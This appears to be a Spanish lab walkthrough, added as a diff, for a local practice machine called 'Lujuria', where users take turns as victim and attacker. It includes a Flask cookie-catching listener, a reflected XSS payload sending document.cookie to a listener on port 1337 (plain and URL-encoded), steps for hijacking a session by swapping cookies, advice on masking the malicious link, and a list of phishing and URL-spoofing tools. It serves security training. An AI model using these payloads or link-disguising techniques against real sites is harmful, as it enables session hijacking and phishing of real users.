@@ -1,0 +1,112 @@
+= Lujuria
+
+Vamos a ver en esta guía como solucionar la máquina *Lujuria*. Se basa en el robo de cookies, por un XSS reflejado y un ligero ataque de phising.
+
+En nuestro caso, actuaremos como *_víctima_* y como *_atacante_*.
+
+* Desde el punto de vista de la *_víctima_* deberemos saber las credenciales para loguearnos y dejar la cuenta abierta. 
+* Desde el punto de vista del *_atacante_* no deberemos saber las credenciales del usuario, pero le enviaremos una campaña de phising ficticia a la víctima.
+
+Sería conveniente utilizar una distribución Linux, es recomendable usar Kali Linux.
+
+== Inicio
+
+Como el despliegue es en local, para comprobar que todo se ha realizado correctamente, deberemos crear dos usuarios en nuestro navegador de confianza:
+
+[cols="1,1"]
+|===
+|Navegador|URL
+
+|Firefox
+|about:profiles
+
+|Brave
+|brave://settings/manageProfile
+
+|Chrome
+|chrome://settings -> "Personas"
+
+|Opera
+|opera://settings/side-profiles-settings
+|===
+
+=== Víctima
+
+Con la máquina desplegada, abrimos nuestra sesión en firefox e introducimos la IP que nos devolverá el *autodeploy.sh*. Una vez en la página de login, introducimos nuestras credenciales (usuario: dante, contraseña: dante123). Una vez dentro de la página, nos quedamos logueados.
+
+=== Atacante
+
+==== Despliegue de servidor a la escucha
+
+Siendo atacantes, vamos a crear un archivos .py con el siguiente script. Este script crea un servidor local que está a la escucha en el puerto 1337. 
+
+Código tomado de https://skf.gitbook.io/asvs-write-ups/httponly-session-hijacking-xss/httponly-session-hijacking-xss#exploitation[Security Knowledge Framework]
+
+[source,python]
+----
+from flask import Flask, request, url_for, render_template, redirect, make_response
+import requests
+
+app = Flask(__name__, static_url_path='/static', static_folder='static')
+app.config['DEBUG'] = True
+
+@app.route("/<steal_cookie>", methods=['GET'])
+def start(steal_cookie):
+    return render_template("evil.html")
+
+if __name__ == "__main__":
+    app.run(host='0.0.0.0', port=1337)
+----
+
+Para poder utilizar este código deberemos tener descargado python3 y después descargaremos las librerias flask y requests. Por último iniciamos el programa.
+
+[source,bash]
+----
+$ sudo apt install python3
+$ pip install flask
+$ pip install requests
+$ python3 app.py
+----
+
+==== Creación de URL maliciosa
+
+Entonces nuestra intención es que la víctima inyecte sin darse cuenta código malicioso javascript. Como atacantes, debemos saber que en la página después de login hay un bloque de texto y que esta es *welcome.php*. 
+
+Entonces vamos a crear nuestra URL maliciosa:
+
+. Comenzamos sabiendo que es el servidor es http, asi que no tiene seguridad. [http://]
+. Sabemos que el dominio es la IP dada por el *autodeploy.sh*. [http://IP/]
+. También conocemos que el servidor tiene la página *welcome.php* y que tiene un bloque de texto. [http://IP/welcome.php?q=] (?q= es la query que espera)
+. Y por último nuestro script en javascript:
+
+[source,javascript]
+----
+<script>new Image().src="http://localhost:1337/?stolen_cookie="+document.cookie;</script>
+----
+
+Entonces nuestra URL maliciosa quedaría tal que:
+
+----
+http://IP/welcome.php?q=<script>new Image().src="http://localhost:1337/?stolen_cookie="+document.cookie;</script>
+----
+
+Pero esta URL no la entenderá correctamente el navegador, tenemos que codificarla:
+
+----
+http://localhost:8080/welcome.php?q=%3Cscript%3Enew%20Image().src%20%3D%20%22http%3A%2F%2Flocalhost%3A1337%2F%3Fstolen_cookie%3D%22%20%2B%20document.cookie%3B%3C/script%3E
+----
+
+==== Los detalles importan
+
+Y si nos gusta atender al detalle, sería recomendable acortar la URL, para que no sea tan sospechosa, incluso podremos enmascararla con algunos programas. Ya que fondomarcador.com posee un acortador, podemos utilizarlo y que parezca menos sospechoso.
+
+Como dato informativo, también existen varios programas en github que nos ayudan a enmascarar nuestra URL o hacernos pasar por otras páginas:
+
+* https://github.com/darkmidus/HiddenEye[HiddenEye] -> HiddenEye es una herramienta de phishing avanzada que permite simular páginas de inicio de sesión falsas para recopilar credenciales. Puede generar enlaces personalizados y utiliza técnicas para evadir detección. También incluye opciones para personalizar ataques dirigidos y simular captchas.
+* https://github.com/yangr0/BlackPhish[BlackPhish] -> BlackPhish es una herramienta para realizar ataques de phishing. Permite crear páginas web maliciosas que se asemejan a servicios populares para recolectar datos. Este programa es modular y está diseñado para principiantes en pruebas de penetración.
+* https://github.com/Darkmux/URLSpoof[URLSpoof] -> URLSpoof es una herramienta para simular enlaces visualmente similares a URLs legítimas mediante el uso de caracteres Unicode. Está diseñada para demostrar ataques de ingeniería social basados en la confianza en los nombres de dominio.
+* https://github.com/UndeadSec/EvilURL[EvilURL] -> EvilURL genera URLs maliciosas que parecen auténticas mediante el uso de caracteres Unicode similares (homoglyphs). Se utiliza para probar la protección de los navegadores frente a ataques de phishing y spoofing de enlaces.
+
+== Finalizar
+
+Como *atacante* entramos en nuestro perfil del navegador y nos metemos en la IP del servidor. Entonces deberemos darle al *F12* e irnos a la sección de *almacenamiento* y en *cookies*, cambiar la nuestra por la de la víctima. Una vez hecho esto, en la barra del navegador deberemos acceder a */welcome.php* y ya estaremos dentro.
